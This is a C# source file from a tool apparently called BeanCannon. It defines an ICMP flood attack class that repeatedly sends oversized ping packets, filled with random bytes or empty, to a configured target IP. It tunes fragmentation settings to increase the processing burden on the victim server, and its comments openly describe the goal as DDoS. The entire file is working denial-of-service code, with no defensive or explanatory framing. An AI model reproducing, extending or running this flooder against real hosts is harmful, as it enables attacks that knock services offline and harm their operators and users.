using BeanCannon.BusinessLogic.Core.Attacks.Settings;
using BeanCannon.BusinessLogic.Core.Randomizers;
using System;
using System.ComponentModel;
using System.Net.NetworkInformation;

namespace BeanCannon.BusinessLogic.Core.Attacks
{
	//start of ICMP class
	public class ICMP : BaseFlooder<ICMPSettings>
	{
		private byte[] bytesToSend;
		private Ping pingSender;
		private PingOptions pingOptions;

		/// <summary>
		/// Create the ICMP object, because we need that, for reasons
		/// </summary>
		public ICMP(ICMPSettings settings) : base(settings)
		{
			this.pingSender = new Ping();
			this.bytesToSend = new byte[65000];

			this.pingOptions = new PingOptions();
			this.pingOptions.Ttl = 128;

			if (settings.UseRandomMessage)
			{
				//if we're sending messages, fragment as greater processing power needed on server to reconstruct
				this.pingOptions.DontFragment = false;
			}
			else
			{
				//not sending messages, don't fragment, ddos through straight volume of requests
				this.pingOptions.DontFragment = true;
			}
		}

		//while working away
		protected override void OnDoWorkEvent(object sender, DoWorkEventArgs e)
		{
			while (State.IsFlooding)
			{
				if (Settings.UseRandomMessage)
				{
					bytesToSend = RandomizerHq.RandomByteArray(65500);
				}
				else
				{
					bytesToSend = new Byte[0];
				}

				State.Status = RequestStatus.Ready;

				for (int i = 0; i < Settings.SocketsPerThread && State.IsFlooding; i++)
				{
					State.Status = RequestStatus.Connecting;
					try
					{
						//send the data with a timeout value of 10ms
						pingSender.SendAsync(Settings.Ip, 10, bytesToSend, pingOptions);
						State.Requested++;
					}
					catch (Exception)
					{
						State.Failed++;
					}

					//dispose of the pingSender because why do WE need to see the replies ;)
					try
					{
						pingSender.SendAsyncCancel();
						pingSender.Dispose();
					}
					catch { }

					State.Status = RequestStatus.Completed;
				}

				if (State.IsFlooding)
				{
					System.Threading.Thread.Sleep(Settings.Delay);
				}

				State.Status = RequestStatus.Ready;
			}
		}
	}
}
